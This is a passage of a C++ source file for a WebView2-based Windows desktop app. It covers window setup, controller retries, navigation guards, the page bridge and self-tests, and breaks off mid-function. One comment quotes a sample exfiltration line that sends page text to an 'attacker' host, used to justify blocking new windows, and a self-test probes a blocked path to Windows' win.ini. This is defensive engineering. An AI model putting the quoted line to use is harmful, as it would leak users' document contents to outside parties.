#include "app_window.h"

#include "../bridge/channels.h"
#include "../app/app.h"
#include "../book/book.h"
#include "../app/single_instance.h"
#include "../settings/bg.h"
#include "../settings/env.h"
#include "../settings/store.h"
#include "../util/file_ops.h"
#include "../util/hash.h"
#include "../util/log.h"
#include "../util/str_util.h"
#include "dialogs.h"
#include "protocol.h"
#include "style.h"

#include "../selftest/selftest.h"

#include <shellapi.h>
#include <shlwapi.h>
#include <WebView2EnvironmentOptions.h>   // CoreWebView2EnvironmentOptions（不在 WebView2.h 里）
#include <wrl.h>

#include <algorithm>
#include <chrono>
#include <filesystem>
#include <string>
#include <vector>

namespace isg {

namespace {

constexpr wchar_t kWindowClass[] = L"ISG_STUDIO_MAIN_WINDOW";
/* 探针窗口**自己的窗口类**。
   ⚠️ 第一版让它复用了主窗口的类 —— 而 WndProc 里没有按 hwnd 分流，于是：
     · 探针 ShowWindow 时发的 WM_SIZE 会把**主窗口**的 WebView2 缩成探针的客户区
       （主界面左上角一块、其余留白，而且不会再改回来）；
     · 用户对探针窗口点叉，WM_CLOSE 分支会 `DestroyWindow(hwnd_)` —— **把主窗口销毁了**。
   这两个都是"只在创建第二个窗口时才显形"的 bug，第三路交叉审查抓到的。
   探针窗口不需要我们处理任何消息（bounds 设一次、加载完读 title 就收），
   所以给一个最小的 DefWindowProc 窗口类即可。 */
constexpr wchar_t kProbeClass[] = L"ISG_STUDIO_PROBE_WINDOW";

LRESULT CALLBACK ProbeWndProcThunk(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_CLOSE) {
        // 关探针就是关探针：只销毁它自己，绝不碰主窗口
        ::DestroyWindow(hwnd);
        return 0;
    }
    return ::DefWindowProcW(hwnd, msg, wp, lp);
}
constexpr wchar_t kWindowTitle[] = L"讲练一体工作台";
constexpr UINT_PTR kTimerId = 1;

/* 窗口尺寸用 DIP（与 Electron 的 1180×820 同口径），创建时按系统 DPI 换成物理像素。
   ⚠️ 声明 PerMonitorV2 之后，CreateWindow 的参数就是**物理像素**了：不换算的话，
   200% 缩放下窗口只有原来的一半大，页面拿到的 innerWidth 也跟着减半。 */
int dip_to_px(int dip) {
    return ::MulDiv(dip, static_cast<int>(::GetDpiForSystem()), 96);
}

/* 自测脚本的硬上限。为什么是 90 秒：那个脚本要等页面里若干次 setTimeout 与一次 iframe
   加载（各自上限 8 秒），正常几秒就回来了。90 秒说明它**卡住了**，而不是"慢" ——
   卡住与慢必须能分开，否则只能靠人来判断"它是不是死了"。 */
constexpr int64_t kSelftestDeadlineMs = 90000;

/* 启动时打给 WebView2 的 Chromium 开关。
   ⚠️ 两条都不是"优化"，是让探针能跑通的前提（Phase 0 实测）： */
constexpr wchar_t kBrowserArgs[] =
    L"--disable-features=CalculateNativeWinOcclusion "
    L"--disable-background-timer-throttling";

std::wstring file_url_for(const std::wstring& path) {
    // 逐段编码，与 protocol_url_for 同一套规则；但这里要给 file:// 用
    std::wstring out = L"file:///";
    std::wstring cur;
    for (size_t i = 0; i < path.size(); ++i) {
        const wchar_t c = path[i];
        if (c == L'\\' || c == L'/') {
            if (!cur.empty()) {
                out += to_wide(uri_component_encode(to_utf8(cur)));
                cur.clear();
            }
            out += L'/';
        } else {
            cur.push_back(c);
        }
    }
    if (!cur.empty()) out += to_wide(uri_component_encode(to_utf8(cur)));
    // 盘符那个 ':' 被编码成了 %3A —— file:// URL 里允许原样的 ':'，解回来更直观
    return replace_wstr(out, L"%3A", L":");
}

}  // namespace

std::wstring ui_index_path() {
    const std::wstring p = exe_dir() + L"\\web\\index.html";
    return stat_path(p).isFile ? p : std::wstring();
}

AppWindow::~AppWindow() { Teardown(); }

LRESULT CALLBACK AppWindow::WndProcThunk(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    AppWindow* self = nullptr;
    if (msg == WM_NCCREATE) {
        auto* cs = reinterpret_cast<CREATESTRUCTW*>(lp);
        self = static_cast<AppWindow*>(cs->lpCreateParams);
        ::SetWindowLongPtrW(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(self));
    } else {
        self = reinterpret_cast<AppWindow*>(::GetWindowLongPtrW(hwnd, GWLP_USERDATA));
    }
    if (self == nullptr) return ::DefWindowProcW(hwnd, msg, wp, lp);
    return self->WndProc(hwnd, msg, wp, lp);
}

LRESULT AppWindow::WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    // 对话框结果要先看（它们由另一个线程投递）
    if (dialogs_handle_message(msg, wp, lp)) return 0;
    // 工作线程排进来的活儿（抽取结果回包）。必须回到主线程再碰 WebView2。
    if (msg == kBridgeWakeMessage) {
        bridge_.DrainUiQueue();
        return 0;
    }

    switch (msg) {
        case WM_DPICHANGED: {
            /* 拖到另一块不同缩放的显示器：按系统建议的矩形重设窗口，
               WM_SIZE 会随后把新的客户区交给 WebView2。不处理的话窗口尺寸停在旧 DPI，
               页面会出现文字与边框错位。 */
            const RECT* suggested = reinterpret_cast<const RECT*>(lp);
            ::SetWindowPos(hwnd, nullptr, suggested->left, suggested->top,
                           suggested->right - suggested->left,
                           suggested->bottom - suggested->top,
                           SWP_NOZORDER | SWP_NOACTIVATE);
            return 0;
        }
        case WM_SIZE:
            if (controller_) {
                RECT rc{};
                ::GetClientRect(hwnd, &rc);
                controller_->put_Bounds(rc);
            }
            return 0;
        case WM_TIMER:
            if (wp == kTimerId) {
                /* 单一时钟：整个启动流程的超时都从这一拍判定。
                   ⚠️ **顺序很重要**：先看"是不是已经收工"，再看"到点没有"。
                   反过来的话，一个永远不返回的自测页面会让超时永远轮不到 ——
                   Phase 0 的交叉审查抓到过一模一样的形态（pending 守卫排在超时判定前面，
                   结果进程永久挂在屏幕外的窗口里：不可见、点不到、关不掉）。 */
                const int64_t now = clock_.now_ms();
                if (completed_) return 0;
                /* 启动竞态兜底：控制器创建失败后，在计时器这一拍再试。
                   回调栈上直接重入会死锁（Phase 1 实测），所以这里只是下一拍。 */
                if (controllerRetryPending_ && now >= controllerRetryAt_) {
                    controllerRetryPending_ = false;
                    StartController();
                    return 0;
                }
                /* 探针状态机的一拍。所有主动动作（Navigate / ExecuteScript）都从这一拍发 ——
                   在 WebView2 的回调栈上做同步的宿主→渲染调用会重入死锁（Phase 1 实测）。 */
                if (verify_) verify_->Tick(now);
                if (selftestStarted_ && tNavDone_ >= 0 && now - tNavDone_ > kSelftestDeadlineMs) {
                    /* 页面里的脚本迟迟不返回（桥上某个 Promise 永远不 settle，或者渲染层自己
                       卡住了）：**明确报出来**，别让整套验证静静挂在这儿等超时被杀 ——
                       被杀掉的话连报告都不会有，而"没有报告"会被读成"还没跑"。 */
                    Report("[BAD] 自测脚本在 " + std::to_string(kSelftestDeadlineMs)
                           + " ms 内没有返回 —— 桥上可能有请求没得到应答"
                             "（上面的 trace 会停在最后一步）");
                    selftestResult_ = Json::object();
                    selftestResult_["ok"] = false;
                    selftestResult_["timeout"] = true;
                    Finish(2, "自测脚本超时");
                    return 0;
                }
                /* 金标准对拍：导航一完成就发夹具（不用等那 1 秒 —— 那一秒是给渲染层画首屏的，
                   而对拍页根本不需要画）。发消息必须在这一拍上做，理由见 OnNavigationCompleted。 */
                if (opt_.selftest == "protocol-live" && liveStep_ == 1 && !liveNavigated_) {
                    liveNavigated_ = true;
                    log_info("protocol-live：导航到未放行的地址");
                    webview_->Navigate(L"isg://local/C%3A/Windows/win.ini");
                    return 0;
                }
                if (goldenPending_) {
                    goldenPending_ = false;
                    goldenStep_ = 1;
                    log_info("开始金标准对拍：先注入逻辑 JS");
                    RunGoldenInject();
                    return 0;
                }
                if (goldenStep_ == 1) {
                    goldenStep_ = 2;   // 下一拍（≥100ms 之后）才发夹具，避开回调栈重入
                    RunGoldenSend();
                    return 0;
                }
                if (!selftestRan_ && opt_.selftest.size() && opt_.selftest != "golden"
                    && tNavDone_ >= 0 && now - tNavDone_ > 1000) {
                    selftestRan_ = true;
                    selftestStarted_ = true;
                    log_info("开始跑自测脚本：" + opt_.selftest);
                    RunSelftest();
                }
                return 0;
            }
            break;
        case WM_CLOSE:
            /* ⚠️ 这里**绝对不能**再调 Finish()。
               Finish 收工时发的就是 WM_CLOSE —— 两边互相触发会变成一个永不停止的消息循环：
               窗口一直在、进程一直不退、计时器那一支又因为 completed_ 已经为真而直接返回，
               于是连"自测超时"这条兜底也永远不会响。表现是**进程永久挂住、什么都不输出**，
               而外面看到的只是"跑了三分钟没动静"（踩过：ui 那套自测就是这么卡住的）。
               正确做法：关窗就是关窗 —— DestroyWindow，由 WM_DESTROY 去结束消息循环。 */
            /* 用户主动关窗：记一笔。收工结算时它算**正常退出（0）**，
               而不是"验证流程没跑完（2）"—— 一个正常关掉的 GUI 程序返回 2
               会被启动器/冒烟脚本读成崩溃（第三路审查实测：taskkill 后退出码是 2）。 */
            userClosed_ = true;
            ::DestroyWindow(hwnd_);
            return 0;
        case WM_DESTROY:
            ::KillTimer(hwnd_, kTimerId);
            /* 窗口真的没了：把句柄清掉，免得后面的 Teardown 对着一个已销毁的 HWND
               再 DestroyWindow 一次（那会走到未定义行为里）。 */
            hwnd_ = nullptr;
            ::PostQuitMessage(exitCode_);
            return 0;
        default:
            break;
    }
    return ::DefWindowProcW(hwnd, msg, wp, lp);
}

bool AppWindow::CreateHostWindow(HINSTANCE hInst) {
    WNDCLASSEXW wc{};
    wc.cbSize = sizeof(wc);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = &AppWindow::WndProcThunk;
    wc.hInstance = hInst;
    wc.hCursor = ::LoadCursorW(nullptr, IDC_ARROW);
    wc.hbrBackground = reinterpret_cast<HBRUSH>(::GetStockObject(WHITE_BRUSH));
    wc.lpszClassName = kWindowClass;
    if (::RegisterClassExW(&wc) == 0 && ::GetLastError() != ERROR_CLASS_ALREADY_EXISTS) {
        log_error("注册窗口类失败（错误码 " + std::to_string(::GetLastError()) + "）");
        return false;
    }

    // 屏幕外（自测）：**仍然可见**，只是摆在可视区之外。
    // 用 show:false 之类的折中会让布局被停、几何信息变成 0（Phase 0 判据 3 验过）。
    const int x = opt_.offscreen ? -32000 : CW_USEDEFAULT;
    const int y = opt_.offscreen ? -32000 : CW_USEDEFAULT;
    hwnd_ = ::CreateWindowExW(0, kWindowClass, kWindowTitle,
                              WS_OVERLAPPEDWINDOW, x, y,
                              dip_to_px(opt_.width), dip_to_px(opt_.height),
                              nullptr, nullptr, hInst, this);
    if (hwnd_ == nullptr) {
        log_error("创建窗口失败（错误码 " + std::to_string(::GetLastError()) + "）");
        return false;
    }
    style_init_for_window(hwnd_);
    ::ShowWindow(hwnd_, SW_SHOW);
    ::UpdateWindow(hwnd_);
    tWindow_ = clock_.now_ms();      // "窗口真的可见"那一刻（纲领 §3.5 的硬指标）
    ::SetTimer(hwnd_, kTimerId, 100, nullptr);
    return true;
}

void AppWindow::StartEnvironment() {
    const std::wstring userData = user_data_dir() + L"\\WebView2";
    std::error_code ec;
    std::filesystem::create_directories(std::filesystem::path(userData), ec);
    /* ⚠️ user data folder 必须是**纯 ASCII**（纲领 §7.1 坑 1）：
       Chromium 在含中文的路径上会报 `Unable to move the cache: 拒绝访问`，
       然后**进程静默退出、退出码 0** —— 用户只看到"闪一下就没了"。
       app.h 的 user_data_dir() 就是用这个理由钉住目录名的。 */
    if (!is_ascii(userData)) {
        envError_ = "配置目录里含非 ASCII 字符，WebView2 会起不来：" + to_utf8(userData);
        log_error(envError_);
        Finish(2, "配置目录含非 ASCII");
        return;
    }

    /* ⚠️ `CoreWebView2EnvironmentOptions` **没有带参数的构造函数** ——
       参数要一个个 put 上去（spike 里那次也是这么做的，第一版照直觉写成三个参数的
       构造调用，编不过）。 */
    auto options = Microsoft::WRL::Make<CoreWebView2EnvironmentOptions>();
    if (!options) {
        envError_ = "创建 WebView2 环境选项失败";
        Finish(2, "环境选项创建失败");
        return;
    }
    options->put_AdditionalBrowserArguments(kBrowserArgs);
    options->put_Language(L"zh-CN");
    if (!protocol_register_scheme(options.Get())) {
        // 登记不上自定义 scheme 就是致命的：isg:// 是预览与校验的唯一通道。
        // **明确失败**，不要"退回到 file:// 试试看"—— 那样预览与校验都会静默降级。
        envError_ = "登记 isg:// 自定义协议失败（WebView2 运行时太旧？）";
        log_error(envError_);
        Finish(2, "登记 isg:// 失败");
        return;
    }

    const HRESULT hr = ::CreateCoreWebView2EnvironmentWithOptions(
        nullptr, userData.c_str(), options.Get(),
        Microsoft::WRL::Callback<ICoreWebView2CreateCoreWebView2EnvironmentCompletedHandler>(
            [this](HRESULT result, ICoreWebView2Environment* env) -> HRESULT {
                OnEnvironmentReady(result, env);
                return S_OK;
            }).Get());
    if (FAILED(hr)) {
        envError_ = "CreateCoreWebView2EnvironmentWithOptions 返回 0x"
                  + std::to_string(static_cast<unsigned long>(hr))
                  + "（多半是没装 WebView2 运行时）";
        log_error(envError_);
        Finish(2, "创建 WebView2 环境失败");
    }
}

void AppWindow::OnEnvironmentReady(HRESULT hr, ICoreWebView2Environment* env) {
    if (tearingDown_) return;
    if (FAILED(hr) || env == nullptr) {
        envError_ = "WebView2 环境创建失败（错误码 " + std::to_string(static_cast<long>(hr)) + "）";
        log_error(envError_);
        Finish(2, "WebView2 环境创建回调失败");
        return;
    }
    env_ = env;
    tEnvReady_ = clock_.now_ms();
    StartController();
}

void AppWindow::StartController() {
    if (tearingDown_ || !env_ || hwnd_ == nullptr) return;
    const HRESULT hr = env_->CreateCoreWebView2Controller(
        hwnd_, Microsoft::WRL::Callback<ICoreWebView2CreateCoreWebView2ControllerCompletedHandler>(
                   [this](HRESULT result, ICoreWebView2Controller* controller) -> HRESULT {
                       OnControllerReady(result, controller);
                       return S_OK;
                   }).Get());
    if (FAILED(hr)) {
        envError_ = "CreateCoreWebView2Controller 返回 0x"
                  + std::to_string(static_cast<unsigned long>(hr));
        log_error(envError_);
        Finish(2, "创建控制器失败");
    }
}

void AppWindow::OnControllerReady(HRESULT hr, ICoreWebView2Controller* controller) {
    if (tearingDown_) return;
    if (FAILED(hr) || controller == nullptr) {
        /* 启动竞态（安装完立刻启动时实测）：E_ABORT 是瞬时的，隔一会儿重开就正常。
           最多再试 3 次（0.4 / 0.8 / 1.2 秒），全部失败才认输。 */
        if (controllerRetries_ < 3) {
            ++controllerRetries_;
            controllerRetryPending_ = true;
            controllerRetryAt_ = clock_.now_ms() + 400 * controllerRetries_;
            log_warn("创建 WebView2 控制器失败（错误码 "
                     + std::to_string(static_cast<long>(hr))
                     + "），第 " + std::to_string(controllerRetries_) + " 次重试");
            return;
        }
        envError_ = "创建 WebView2 控制器失败（错误码 " + std::to_string(static_cast<long>(hr)) + "）";
        log_error(envError_);
        Finish(2, "控制器创建回调失败");
        return;
    }
    controllerRetries_ = 0;
    controllerRetryPending_ = false;
    controller_ = controller;
    tControllerReady_ = clock_.now_ms();
    if (FAILED(controller_->get_CoreWebView2(&webview_)) || !webview_) {
        envError_ = "拿不到 ICoreWebView2";
        Finish(2, "拿不到 ICoreWebView2");
        return;
    }
    ConfigureWebView();
    Navigate();
}

void AppWindow::ConfigureWebView() {
    RECT rc{};
    ::GetClientRect(hwnd_, &rc);
    controller_->put_Bounds(rc);
    controller_->put_IsVisible(TRUE);

    ComPtr<ICoreWebView2Settings> settings;
    if (SUCCEEDED(webview_->get_Settings(&settings)) && settings) {
        // UI 是我们自己的页面，不需要右键菜单里的"查看源代码/打印"（那是浏览器的东西）
        settings->put_AreDefaultContextMenusEnabled(TRUE);
        settings->put_IsStatusBarEnabled(FALSE);
        settings->put_AreDevToolsEnabled(opt_.devtools ? TRUE : FALSE);
        settings->put_IsWebMessageEnabled(TRUE);       // 桥的前提
        settings->put_AreHostObjectsAllowed(FALSE);    // 不用 host object：桥只走 postMessage
        // 弹出窗口我们自己处理（见 OnNewWindowRequested）：绝不交给系统浏览器
        settings->put_IsScriptEnabled(TRUE);
    }
    // 拖拽进来的文件要能拿到真实路径（见 isg-bridge.js 的 pathForFile 说明）
    /* `AllowExternalDrop` 挂在 **ICoreWebView2Controller4** 上（不是 3）。 */
    ComPtr<ICoreWebView2Controller4> ctl4;
    if (SUCCEEDED(controller_->QueryInterface(IID_PPV_ARGS(&ctl4))) && ctl4) {
        ctl4->put_AllowExternalDrop(TRUE);
    } else {
        log_warn("这个 WebView2 运行时没有 Controller4 接口，拖拽文件的真实路径拿不到");
    }

    protocol_install(webview_.Get());

    /* **导航守卫**：只允许离开我们指定的那一页（oracle 的 `will-navigate` 等价物）。
       为什么必须有：只要有一次 dragover 忘了 preventDefault，Chromium 会把整个窗口
       导航到那个被拖进来的文件上 —— SPA 被销毁、白屏、`window.isg` 也随之消失，
       而用户看到的只是"界面没了"。Phase 0 的遗留 1 就要求把这一层带进 shell/。
       ⚠️ 只拦**顶层导航**；探针窗口（Phase 5）要更严：一律拒绝。 */
    webview_->add_NavigationStarting(
        Microsoft::WRL::Callback<ICoreWebView2NavigationStartingEventHandler>(
            [this](ICoreWebView2* sender, ICoreWebView2NavigationStartingEventArgs* args) -> HRESULT {
                (void)sender;
                if (tearingDown_ || args == nullptr) return S_OK;
                /* protocol-live 这套自测**故意**要导航到"不该去"的地址（去看 403 那一支）。
                   守卫在这里必须让路，否则它会把被测的那次导航拦掉 —— 那就成了
                   "守卫把测试拦绿了"（判据测的是守卫，不是协议）。 */
                if (opt_.selftest == "protocol-live") return S_OK;
                LPWSTR uriRaw = nullptr;
                if (FAILED(args->get_Uri(&uriRaw)) || uriRaw == nullptr) return S_OK;
                const std::string uri = to_utf8(uriRaw);
                ::CoTaskMemFree(uriRaw);
                /* 允许：导航目标本身（含 hash/query 的变化，比如 #settings 不触发顶层导航，
                   但保险起见按 pathname 比）；以及首次导航到 uiUrl_。 */
                auto path_of = [](std::string u) {
                    const size_t h = u.find('#');
                    if (h != std::string::npos) u = u.substr(0, h);
                    const size_t q = u.find('?');
                    if (q != std::string::npos) u = u.substr(0, q);
                    return ascii_lower(u);
                };
                if (!uiUrl_.empty() && path_of(uri) != path_of(uiUrl_)) {
                    log_warn("拦下了一次离开工作台界面的导航：" + uri);
                    args->put_Cancel(TRUE);
                }
                return S_OK;
            }).Get(), &navStartToken_);
    navStartHooked_ = true;

    webview_->add_NavigationCompleted(
        Microsoft::WRL::Callback<ICoreWebView2NavigationCompletedEventHandler>(
            [this](ICoreWebView2* sender, ICoreWebView2NavigationCompletedEventArgs* args) -> HRESULT {
                (void)sender;
                BOOL success = FALSE;
                args->get_IsSuccess(&success);
                OnNavigationCompleted(S_OK, success);
                return S_OK;
            }).Get(), &navToken_);
    navHooked_ = true;

    webview_->add_WebMessageReceived(
        Microsoft::WRL::Callback<ICoreWebView2WebMessageReceivedEventHandler>(
            [this](ICoreWebView2* sender, ICoreWebView2WebMessageReceivedEventArgs* args) -> HRESULT {
                (void)sender;
                OnWebMessage(args);
                return S_OK;
            }).Get(), &msgToken_);
    msgHooked_ = true;

    webview_->add_NewWindowRequested(
        Microsoft::WRL::Callback<ICoreWebView2NewWindowRequestedEventHandler>(
            [this](ICoreWebView2* sender, ICoreWebView2NewWindowRequestedEventArgs* args) -> HRESULT {
                (void)sender;
                OnNewWindowRequested(args);
                return S_OK;
            }).Get(), &newWinToken_);
    newWinHooked_ = true;

    /* 进程失败（浏览器进程崩了/被杀）必须**立刻收工**。
       不注册它的话，控制器回调永远不来，而我们的超时判定如果又排在 pending 守卫后面
       （Phase 0 交叉审查抓到的那个 bug），进程就会永久挂在屏幕外的窗口里：
       不可见、点不到、关不掉。 */
    webview_->add_ProcessFailed(
        Microsoft::WRL::Callback<ICoreWebView2ProcessFailedEventHandler>(
            [this](ICoreWebView2* sender, ICoreWebView2ProcessFailedEventArgs* args) -> HRESULT {
                (void)sender;
                OnProcessFailed(args);
                return S_OK;
            }).Get(), &procFailToken_);
    procFailHooked_ = true;
}

void AppWindow::OnProcessFailed(ICoreWebView2ProcessFailedEventArgs* args) {
    log_error("OnProcessFailed 被调用了");
    if (tearingDown_) return;
    COREWEBVIEW2_PROCESS_FAILED_KIND kind = COREWEBVIEW2_PROCESS_FAILED_KIND_BROWSER_PROCESS_EXITED;
    if (args) args->get_ProcessFailedKind(&kind);
    log_error("WebView2 进程失败（kind=" + std::to_string(static_cast<int>(kind)) + "），收工");
    Finish(2, "WebView2 进程失败");
}

void AppWindow::OnNewWindowRequested(ICoreWebView2NewWindowRequestedEventArgs* args) {
    /* 页面里的 window.open / target=_blank：**一律拒**。
       生成页的 CSP 里 frame-src 'none'，但**导航不属于 CSP 管的资源类型** ——
       一句 `location.href='https://attacker/?d='+document.body.textContent`
       就能把读到的课件正文发出去（oracle 的 verify/guard.js 就是为这个存在的，
       审计留档 test/_audit/v6/t4-result.json）。这里先把最外层的口子堵上：
       不开新窗口、也不让这次导航发生。 */
    if (args) {
        args->put_Handled(TRUE);
        ComPtr<ICoreWebView2Deferral> deferral;
        if (SUCCEEDED(args->GetDeferral(&deferral)) && deferral) {
            deferral->Complete();
        }
    }
    log_warn("拒绝了页面发起的新窗口请求（外部导航一律不通）");
}

void AppWindow::WirePipeline() {
    /* 任务层与网络层挂在 Bridge 上：Bridge 是页面消息的唯一入口，
       所以 `gen:*` 与 `_pipeline:*` 的排布也只有这一处。 */
    bridge_.SetJobs(&jobs_);
    bridge_.SetNet(&net_);
    /* Phase 5：探针窗口服务。只在第一次 WirePipeline 时创建（一个任务一份就够）。 */
    if (!verify_) verify_ = std::make_unique<ProbeRunner>(hwnd_, hInst_);
    auto submit_verify = [this](const Json& a, bool demo, Bridge::ReplyFn reply) {
        VerifyRequest req;
        req.kind = demo ? VerifyRequest::Kind::kDemo : VerifyRequest::Kind::kProbe;
        const Json args = a.is_object() ? a : Json::object();
        req.htmlPath = args.contains("htmlPath") && args["htmlPath"].is_string()
                           ? args["htmlPath"].get<std::string>() : std::string();
        if (args.contains("demos") && args["demos"].is_array()) req.demos = args["demos"];
        else req.demos = Json::array();
        if (args.contains("probes") && args["probes"].is_array()) {
            for (const Json& p : args["probes"]) {
                if (p.is_string()) req.probes.push_back(p.get<std::string>());
            }
        }
        if (args.contains("timeoutMs") && args["timeoutMs"].is_number()) {
            req.timeoutMs = args["timeoutMs"].get<int>();
        }
        if (req.htmlPath.empty()) {
            reply(BridgeResult::Fail("BAD_ARG", "没有给出要校验的 HTML"));
            return;
        }
        verify_->Submit(std::move(req),
                        [reply](bool ok, const Json& data, const std::string& err) {
            if (!ok) { reply(BridgeResult::Fail("VERIFY_FAILED", err)); return; }
            reply(BridgeResult::Ok(data));
        });
    };
    bridge_.SetVerifyHandlers(
        [submit_verify](const Json& a, Bridge::ReplyFn reply) { submit_verify(a, false, reply); },
        [submit_verify](const Json& a, Bridge::ReplyFn reply) { submit_verify(a, true, reply); });
    jobs_.SetEmitter([this](const Json& payload) {
        bridge_.EmitEvent(kEventJobEvent, payload);
    });
    net_.SetSender([this](const Json& m) {
        // 工作线程 → UI 线程 → 页面。**绝不**在工作线程里碰 WebView2。
        bridge_.PostMessageFromAnyThread(m);
    });
    bridge_.SetInternalHandler([this](const Json& m) {
        const std::string kind = (m.contains("kind") && m["kind"].is_string())
                                     ? m["kind"].get<std::string>() : std::string();
        if (kind == "pipeline") {
            const std::string op = (m.contains("op") && m["op"].is_string())
                                       ? m["op"].get<std::string>() : std::string();
            if (op == "allow") {
                const std::string jobId = m.value("jobId", std::string());
                const std::string path = m.value("path", std::string());
                std::wstring abs;
                if (jobs_.ValidateOutputPath(jobId, path, abs)) {
                    protocol_allow(abs);
                } else {
                    log_warn("[pipeline] 拒绝放行一个不在任务输出目录里的路径：" + path);
                }
                return;
            }
            /* ⚠️ 页面消息是**不可信输入**的一部分（它可能被改坏、也可能是版本不匹配）。
               宿主侧没有顶层 try/catch，一个 nlohmann 类型异常就会 std::terminate，
               收尾路径全跳过、报告一个字节都没有 —— 这个工程吃过这个亏
               （settings.json 里的数组就触发过 0xC0000409）。所以这一跳自己兜住。 */
            try {
                jobs_.HandlePageMessage(m);
            } catch (const std::exception& e) {
                const std::string jobId = m.contains("jobId") && m["jobId"].is_string()
                                              ? m["jobId"].get<std::string>() : std::string();
                log_error(std::string("[pipeline] 处理页面消息时抛异常：") + e.what());
                Json fail = Json::object();
                fail["op"] = "fail";
                fail["jobId"] = jobId;
                fail["error"] = Json::object();
                fail["error"]["message"] = std::string("宿主处理流水线消息时出错：") + e.what();
                jobs_.HandlePageMessage(fail);
            }
            return;
        }
        if (kind == "http-fetch") {
            try {
                net_.Start(m);          // UI 线程：读设置里的 Key
            } catch (const std::exception& e) {
                log_error(std::string("[net] 启动请求时抛异常：") + e.what());
                Json err = Json::object();
                err["__isg"] = 1;
                err["kind"] = "http-error";
                err["id"] = m.contains("id") && m["id"].is_number() ? m["id"].get<int>() : 0;
                err["code"] = "ENETWORK";
                err["message"] = e.what();
                bridge_.PostMessageFromAnyThread(err);
            }
            return;
        }
        if (kind == "http-abort") {
            const int id = m.contains("id") && m["id"].is_number() ? m["id"].get<int>() : 0;
            net_.Abort(id);
        }
    });
}

void AppWindow::Navigate() {
    if (opt_.selftest == "protocol-live") {
        /* 用**导航**来测协议 handler 的两条路（放行 → 200 + CSP；未放行 → 403 且 deniedCount++）。
           为什么不用页面里的 iframe/img：实测 isg:// 的**子资源请求根本到不了
           `WebResourceRequested`**（宿主侧 wrcAll 恒为 1，只有文档请求进来了），
           写出来的判据会"看起来测了、其实没发请求"。导航这条路是实测能到达的。 */
        const std::wstring dir = user_data_dir() + L"\\selftest";
        std::error_code ec;
        std::filesystem::create_directories(std::filesystem::path(dir), ec);
        const std::wstring probe = dir + L"\\protocol-live.html";
        write_file_bytes(probe, "<!doctype html><meta charset=\"utf-8\"><title>live</title>ok");
        protocol_allow(probe);
        liveProbeUrl_ = protocol_url_for(probe);
        uiUrl_ = liveProbeUrl_;
        Report("[live] 先导航到一个**已放行**的 isg:// 文档");
        bridge_.Attach(hwnd_, webview_.Get(), uiUrl_);
        bridge_.SetUiWaker([this] {
            if (hwnd_) ::PostMessageW(hwnd_, kBridgeWakeMessage, 0, 0);
        });
        WirePipeline();
        webview_->Navigate(to_wide(liveProbeUrl_).c_str());
        return;
    }
    if (!opt_.goldenFixture.empty()) {
        /* 金标准模式：导航到对拍执行页（在 logic-bundle.js 旁边，这样相对路径能解析）。 */
        const std::wstring page = exe_dir() + L"\\web\\logic\\golden-runner.html";
        if (!stat_path(page).isFile) {
            envError_ = "找不到对拍执行页：" + to_utf8(page);
            log_error(envError_);
            Finish(2, "找不到对拍执行页");
            return;
        }
        uiUrl_ = to_utf8(file_url_for(page));
        bridge_.Attach(hwnd_, webview_.Get(), uiUrl_);
        bridge_.SetUiWaker([this] {
            if (hwnd_) ::PostMessageW(hwnd_, kBridgeWakeMessage, 0, 0);
        });
        WirePipeline();
        const HRESULT hr = webview_->Navigate(to_wide(uiUrl_).c_str());
        if (FAILED(hr)) {
            envError_ = "导航到对拍执行页失败";
            Finish(2, "导航到对拍执行页失败");
        }
        return;
    }
    const std::wstring index = ui_index_path();
    if (index.empty()) {
        envError_ = "找不到界面文件（<exe 同目录>\\web\\index.html）。"
                    "开发态请确认 build 之后 dist/web 存在（CMake 会自动拷）。";
        log_error(envError_);
        Finish(2, "找不到界面文件");
        return;
    }
    // UI 走 file://（与 oracle 的 win.loadFile 一致）：index.html 自己的 CSP 里
    // 写着 `img-src … file: isg:`，正是为这个来源准备的。**不要**改成 isg:// ——
    // 那条路径上会连带挂上"给模型产出页用的"严格 CSP，把界面自己打死。
    uiUrl_ = to_utf8(file_url_for(index));
    /* 桥在**导航之前**挂上（它要在文档创建前就位），并且把"我们这一页"的 URL 一起交过去 ——
       来源检查只比 pathname（见 bridge.cpp）。 */
    bridge_.Attach(hwnd_, webview_.Get(), uiUrl_);
        bridge_.SetUiWaker([this] {
            if (hwnd_) ::PostMessageW(hwnd_, kBridgeWakeMessage, 0, 0);
        });
    WirePipeline();
    const HRESULT hr = webview_->Navigate(to_wide(uiUrl_).c_str());
    if (FAILED(hr)) {
        envError_ = "导航失败（0x" + std::to_string(static_cast<unsigned long>(hr)) + "）";
        log_error(envError_);
        Finish(2, "导航失败");
    }
}

void AppWindow::OnNavigationCompleted(HRESULT, BOOL success) {
    // hr 不用：IsSuccess 才是判据（hr 只说明"事件送达到了"，与页面加载成败无关）
    if (tearingDown_) return;
    tNavDone_ = clock_.now_ms();
    log_info(std::string("导航完成（success=") + (success ? "1" : "0") + "）");
        if (opt_.selftest == "protocol-live") {
        if (liveStep_ == 0) {
            liveStep_ = 1;
            const ProtocolStats& st = protocol_stats();
            Report(std::string(success ? "  [ok]  " : "  [BAD] ") + "已放行的 isg:// 文档加载成功");
            Report(std::string(st.docResponseServed > 0 ? "  [ok]  " : "  [BAD] ")
                   + "文档真的由我们服务出来（docResponseServed=" + std::to_string(st.docResponseServed) + "）");
            Report(std::string(st.cspHeaderSent ? "  [ok]  " : "  [BAD] ")
                   + "HTML 响应的头里带了 CSP（cspHeaderSent）");
            const bool firstOk = success && st.docResponseServed > 0 && st.cspHeaderSent;
            liveFirstOk_ = firstOk;
            /* 再导航到一个**未放行**的位置。白名单在 stat 之前就判，所以这个请求
               一定走 403 分支（而不是 404）。 */
            /* ⚠️ **不在这里再发一次 Navigate**：在 `NavigationCompleted` 的回调栈上发导航
               实测不会走完（第二次的 completed 永远不来，进程挂到超时）。
               与"宿主→页面同步调用会死锁"是同一类问题：**所有由我们主动发出的动作，
               都从计时器那一拍发**。 */
            Report("[live] 下一步：导航到一个**未放行**的 isg:// 地址（期望 403 + deniedCount++）");
            return;
        }
        if (liveStep_ == 1) {
            liveStep_ = 2;
            const ProtocolStats& st = protocol_stats();
            const int before = liveFirstOk_ ? 0 : 1;
